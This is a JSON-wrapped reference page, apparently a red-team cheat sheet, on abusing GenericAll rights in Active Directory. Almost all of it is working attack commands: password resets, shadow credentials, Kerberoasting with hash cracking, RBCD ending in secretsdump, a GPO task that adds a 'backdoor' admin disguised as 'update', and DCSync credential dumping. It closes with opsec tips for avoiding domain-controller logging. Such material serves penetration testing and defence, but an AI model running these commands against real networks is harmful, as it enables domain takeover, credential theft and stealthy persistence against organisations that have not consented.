{"title": "GenericAll", "source": "bloodhound", "source_label": "BloodHound", "path": "edges/GenericAll", "html": "<h1 id=\"genericall\">GenericAll</h1>\n<blockquote>\n<p>Source has full control over target object — equivalent to ownership</p>\n</blockquote>\n<p><strong>Applies to</strong>: User → User, User → Group, User → Computer, Group → any, Computer → any</p>\n<hr>\n<h2 id=\"linux-abuse\">Linux Abuse</h2>\n<h3 id=\"target-user-password-reset\">Target: User — password reset</h3>\n<h4 id=\"bloodyad\">bloodyAD</h4>\n<div class=\"highlight\"><pre><span></span><code>bloodyad<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--host<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"nb\">set</span><span class=\"w\"> </span>password<span class=\"w\"> </span>&lt;target-user&gt;<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;new-password&gt;&#39;</span>\n</code></pre></div>\n<h4 id=\"impacket\">Impacket</h4>\n<div class=\"highlight\"><pre><span></span><code>net<span class=\"w\"> </span>rpc<span class=\"w\"> </span>password<span class=\"w\"> </span>&lt;target-user&gt;<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;new-password&gt;&#39;</span><span class=\"w\"> </span>-U<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;%<span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-S<span class=\"w\"> </span>&lt;dc-ip&gt;\n</code></pre></div>\n<h3 id=\"target-user-shadow-credentials-no-password-reset-needed\">Target: User — shadow credentials (no password reset needed)</h3>\n<div class=\"highlight\"><pre><span></span><code>certipy-ad<span class=\"w\"> </span>shadow<span class=\"w\"> </span>auto<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;@&lt;domain&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-account<span class=\"w\"> </span>&lt;target-user&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\n</code></pre></div>\n<h3 id=\"target-user-targeted-kerberoast-set-spn-then-roast\">Target: User — targeted Kerberoast (set SPN then roast)</h3>\n<div class=\"highlight\"><pre><span></span><code>bloodyad<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--host<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"nb\">set</span><span class=\"w\"> </span>object<span class=\"w\"> </span>&lt;target-user&gt;<span class=\"w\"> </span>servicePrincipalName<span class=\"w\"> </span>-v<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;spn&gt;&#39;</span>\nGetUserSPNs.py<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-request-user<span class=\"w\"> </span>&lt;target-user&gt;<span class=\"w\"> </span>-outputfile<span class=\"w\"> </span>hashes.txt\nhashcat<span class=\"w\"> </span>-m<span class=\"w\"> </span><span class=\"m\">13100</span><span class=\"w\"> </span>hashes.txt<span class=\"w\"> </span>/usr/share/wordlists/rockyou.txt\n</code></pre></div>\n<h3 id=\"target-group-add-member\">Target: Group — add member</h3>\n<div class=\"highlight\"><pre><span></span><code>bloodyad<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--host<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>add<span class=\"w\"> </span>groupMember<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span><span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span>\n</code></pre></div>\n<h3 id=\"target-computer-shadow-credentials-rbcd-or-s4u2self\">Target: Computer — shadow credentials → RBCD or S4U2Self</h3>\n<div class=\"highlight\"><pre><span></span><code>certipy-ad<span class=\"w\"> </span>shadow<span class=\"w\"> </span>auto<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;@&lt;domain&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-account<span class=\"w\"> </span>&lt;target-computer$&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\n<span class=\"c1\"># certipy outputs NT hash; use with getST.py or pass-the-hash</span>\n</code></pre></div>\n<h3 id=\"target-computer-rbcd-resource-based-constrained-delegation\">Target: Computer — RBCD (Resource-Based Constrained Delegation)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># 1. Get/create a computer account we control</span>\naddcomputer.py<span class=\"w\"> </span>-computer-name<span class=\"w\"> </span><span class=\"s1\">&#39;ATTACKPC$&#39;</span><span class=\"w\"> </span>-computer-pass<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;new-password&gt;&#39;</span><span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;&#39;</span>\n\n<span class=\"c1\"># 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on target</span>\nrbcd.py<span class=\"w\"> </span>-f<span class=\"w\"> </span>ATTACKPC<span class=\"w\"> </span>-t<span class=\"w\"> </span>&lt;target-computer&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;&#39;</span>\n\n<span class=\"c1\"># 3. Get service ticket impersonating admin</span>\ngetST.py<span class=\"w\"> </span>-spn<span class=\"w\"> </span>cifs/&lt;target-computer&gt;.&lt;domain&gt;<span class=\"w\"> </span>-impersonate<span class=\"w\"> </span>Administrator<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;/ATTACKPC$:&lt;new-password&gt;&#39;</span>\n<span class=\"nb\">export</span><span class=\"w\"> </span><span class=\"nv\">KRB5CCNAME</span><span class=\"o\">=</span>Administrator@cifs_&lt;target-computer&gt;.&lt;domain&gt;@&lt;domain&gt;.ccache\n\n<span class=\"c1\"># 4. Use ticket</span>\nsecretsdump.py<span class=\"w\"> </span>-k<span class=\"w\"> </span>-no-pass<span class=\"w\"> </span>&lt;target-computer&gt;.&lt;domain&gt;\n</code></pre></div>\n<h3 id=\"target-gpo-modify-gpo-via-pygpoabuse\">Target: GPO — modify GPO via pyGPOAbuse</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># GenericAll over a GPO object</span>\npython3<span class=\"w\"> </span>pygpoabuse.py<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-gpo-id<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;gpo-guid&gt;&#39;</span><span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">    </span>-powershell<span class=\"w\"> </span>-command<span class=\"w\"> </span><span class=\"s2\">&quot;net user backdoor P@ssw0rd123 /add &amp;&amp; net localgroup administrators backdoor /add&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">    </span>-taskname<span class=\"w\"> </span><span class=\"s1\">&#39;Backdoor&#39;</span><span class=\"w\"> </span>-description<span class=\"w\"> </span><span class=\"s1\">&#39;update&#39;</span>\n</code></pre></div>\n<h3 id=\"target-domain-dcsync\">Target: Domain — DCSync</h3>\n<div class=\"highlight\"><pre><span></span><code>dacledit.py<span class=\"w\"> </span>-action<span class=\"w\"> </span>write<span class=\"w\"> </span>-rights<span class=\"w\"> </span>DCSync<span class=\"w\"> </span>-principal<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-target-dn<span class=\"w\"> </span><span class=\"s1\">&#39;DC=&lt;domain&gt;,DC=&lt;tld&gt;&#39;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">    </span><span class=\"s1\">&#39;&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;&#39;</span><span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\nsecretsdump.py<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;&#39;</span><span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\n</code></pre></div>\n<hr>\n<h2 id=\"windows-abuse\">Windows Abuse</h2>\n<h3 id=\"target-user-password-reset_1\">Target: User — password reset</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$cred</span> <span class=\"p\">=</span> <span class=\"nb\">Get-Credential</span>  <span class=\"c\"># or build manually</span>\n<span class=\"nv\">$pass</span> <span class=\"p\">=</span> <span class=\"nb\">ConvertTo-SecureString</span> <span class=\"s1\">&#39;&lt;new-password&gt;&#39;</span> <span class=\"n\">-AsPlainText</span> <span class=\"n\">-Force</span>\n<span class=\"nb\">Set-DomainUserPassword</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">target-user</span><span class=\"p\">&gt;</span> <span class=\"n\">-AccountPassword</span> <span class=\"nv\">$pass</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$cred</span>\n</code></pre></div>\n<h3 id=\"target-user-shadow-credentials\">Target: User — shadow credentials</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c\"># Whisker</span>\n<span class=\"n\">Whisker</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">add</span> <span class=\"p\">/</span><span class=\"n\">target</span><span class=\"p\">:&lt;</span><span class=\"n\">target-user</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">dc</span><span class=\"p\">:&lt;</span><span class=\"n\">dc-ip</span><span class=\"p\">&gt;</span>\n<span class=\"c\"># Whisker outputs Rubeus command — run it to get TGT + NT hash</span>\n</code></pre></div>\n<h3 id=\"target-group-add-member_1\">Target: Group — add member</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Add-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span> <span class=\"n\">-Members</span> <span class=\"s1\">&#39;&lt;username&gt;&#39;</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$cred</span>\n<span class=\"c\"># or</span>\n<span class=\"n\">net</span> <span class=\"nb\">group </span><span class=\"s2\">&quot;&lt;target-group&gt;&quot;</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">add</span> <span class=\"p\">/</span><span class=\"n\">domain</span>\n</code></pre></div>\n<h3 id=\"target-computer-rbcd\">Target: Computer — RBCD</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c\"># Requires PowerMad + PowerView</span>\n<span class=\"nv\">$AttackerSID</span> <span class=\"p\">=</span> <span class=\"nb\">Get-DomainComputer</span> <span class=\"s1\">&#39;ATTACKPC$&#39;</span> <span class=\"n\">-Properties</span> <span class=\"n\">objectsid</span> <span class=\"p\">|</span> <span class=\"nb\">Select </span><span class=\"n\">-Expand</span> <span class=\"n\">objectsid</span>\n<span class=\"nv\">$SD</span> <span class=\"p\">=</span> <span class=\"nb\">New-Object</span> <span class=\"n\">Security</span><span class=\"p\">.</span><span class=\"n\">AccessControl</span><span class=\"p\">.</span><span class=\"n\">RawSecurityDescriptor</span> <span class=\"n\">-ArgumentList</span> <span class=\"s2\">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSID)&quot;</span>\n<span class=\"nv\">$SDBytes</span> <span class=\"p\">=</span> <span class=\"nb\">New-Object</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"p\">(</span><span class=\"nv\">$SD</span><span class=\"p\">.</span><span class=\"n\">BinaryLength</span><span class=\"p\">);</span> <span class=\"nv\">$SD</span><span class=\"p\">.</span><span class=\"n\">GetBinaryForm</span><span class=\"p\">(</span><span class=\"nv\">$SDBytes</span><span class=\"p\">,</span> <span class=\"n\">0</span><span class=\"p\">)</span>\n<span class=\"nb\">Get-DomainComputer</span> <span class=\"p\">&lt;</span><span class=\"n\">target-computer</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"nb\">Set-DomainObject</span> <span class=\"n\">-Set</span> <span class=\"p\">@{</span><span class=\"s1\">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class=\"p\">=</span><span class=\"nv\">$SDBytes</span><span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"target-gpo\">Target: GPO</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c\"># SharpGPOAbuse</span>\n<span class=\"n\">SharpGPOAbuse</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"p\">-</span><span class=\"n\">-AddLocalAdmin</span> <span class=\"p\">-</span><span class=\"n\">-UserAccount</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"p\">-</span><span class=\"n\">-GPOName</span> <span class=\"s2\">&quot;&lt;gpo-name&gt;&quot;</span>\n<span class=\"n\">SharpGPOAbuse</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"p\">-</span><span class=\"n\">-AddComputerScript</span> <span class=\"p\">-</span><span class=\"n\">-ScriptName</span> <span class=\"n\">evil</span><span class=\"p\">.</span><span class=\"n\">ps1</span> <span class=\"p\">-</span><span class=\"n\">-ScriptContents</span> <span class=\"s2\">&quot;...&quot;</span> <span class=\"p\">-</span><span class=\"n\">-GPOName</span> <span class=\"s2\">&quot;&lt;gpo-name&gt;&quot;</span>\n</code></pre></div>\n<h3 id=\"rubeus-shadow-creds-nt-hash\">Rubeus (shadow creds → NT hash)</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe asktgt /user:&lt;target-user&gt; /certificate:&lt;base64-pfx&gt; /password:&lt;pfx-pass&gt; /nowrap /getcredentials\n</code></pre></div>\n<hr>\n<h2 id=\"opsec\">Opsec</h2>\n<ul>\n<li>Password resets generate event 4723/4724 (logged on DC) — noisy</li>\n<li>RBCD and shadow credentials are quieter; prefer them when target is a user or computer</li>\n</ul>", "excerpt": "GenericAll Source has full control over target object — equivalent to ownership Applies to : User → User, User → Group, User → Computer, Group → any, Computer → any Linux Abuse Target: User — password reset bloodyAD bloodyad -u &lt;username&gt; -p…", "tags": []}